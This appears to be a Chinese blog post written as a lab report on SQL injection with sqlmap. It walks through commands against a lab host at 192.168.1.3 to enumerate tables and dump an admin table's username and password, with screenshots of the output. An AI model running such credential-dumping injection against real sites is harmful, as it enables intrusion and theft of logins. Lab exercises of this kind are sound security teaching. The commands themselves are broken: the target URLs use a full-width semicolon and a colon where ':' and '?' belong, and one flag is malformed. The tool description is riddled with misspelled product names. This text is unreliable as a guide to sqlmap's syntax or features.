---
layout: post
title: "Sqlmap数据库注入攻击"
description: "Sqlmap数据库注入攻击"
tag: web 安全
---

<br />

---

<br />

## **实验目的:**

##### &nbsp;&nbsp;&nbsp;1.利用sqlmap命令破解出access数据中的admin的密码bfpms

<br />

## **实验原理:**

##### &nbsp;&nbsp;&nbsp; SQLMap是一个先进的自动化SQL注入工具，其主要功能是扫描、发现并利用给定的URL的SQL注入漏洞。
##### &nbsp;&nbsp;&nbsp; 目前支持的数据库管理系统包括Ms-soL、MySQL、Oracde和PostgreSQL.也能够识别诸如DB2、Informix. Sybase、Interbase和MS Access之类的数据库系统。
##### &nbsp;&nbsp;&nbsp; SQL Map采用四种独特的SQL注入技术，分别是盲推理SQL注入、UNION查询SQL注入、堆查询和基于时间的SQL盲注人。其广泛的功能和选项包括数据库指纹、枚举、数据提取、访问目标文件系统，并在获取完全操作权限时执行任意命令。
##### &nbsp;&nbsp;&nbsp; 此外，该工具还可以从Burp Proxy直接从Web Scarab日志及标准的文本文件中解析目标列表。更突出的是，它提供采用分类Coogle dorks扫描Oragle拽索引|擎,获取指定目标的功能。

<br />

## **实验步骤:**

<br />

<b>●</b>进入命令行，用su root 切换为root用户

<br>

<b>○</b>输入命令

<code>sqlmap -u http://192.168.1.3；8008/onews.asp:id=45</code> -u扫描注入点及目标主机，检测出的信息准确

<img src="/files/Sqlmap database injection attack/1.png" width="600px" height="300px">

<br />

<b>●</b>输入命令
 
<code>sqlmap -u http://192.168.1.3；8008/onews.asp:id=45 --users</code> 获取到用户名（这里应该是获取不到）

<img src="/files/Sqlmap database injection attack/2.png" width="600px" height="300px">

<br />

<b>○</b>输入命令

<code>sqlmap -u http://192.168.1.3；8008/onews.asp:id=45 --dump -tables</code> 探测数据库和表信息

<img src="/files/Sqlmap database injection attack/3.png" width="600px" height="300px">

<br />

<b>●</b>显示探测出来的字段信息

<img src="/files/Sqlmap database injection attack/4.png" width="600px" height="150px">

<br />

<b>○</b>针对admin表探测出来的结构

<img src="/files/Sqlmap database injection attack/5.png" width="600px" height="150px">

<br />

<br />

<b>●</b>输入命令

<code>sqlmap -u http://192.168.1.3；8008/onews.asp:id=45 --dump -T admin -C admin,password</code> 进行暴库，获得用户名和密码

<img src="/files/Sqlmap database injection attack/6.png" width="600px" height="300px">

<br />

## **实验总结:**

sqlmap功能非常强大，但是若要获取有用的信息，花在注入上的时间还是很多的;

它基于命令行进行操作，操作起来感觉不是蛮难，但是检测出来的的信息却比较难甄别，有很多是关于数据库的，要有数据库基础;

要用好这个工具，需要花时间多练习，多熟练，并且多了解它的其它功能，理解其背后的原理。

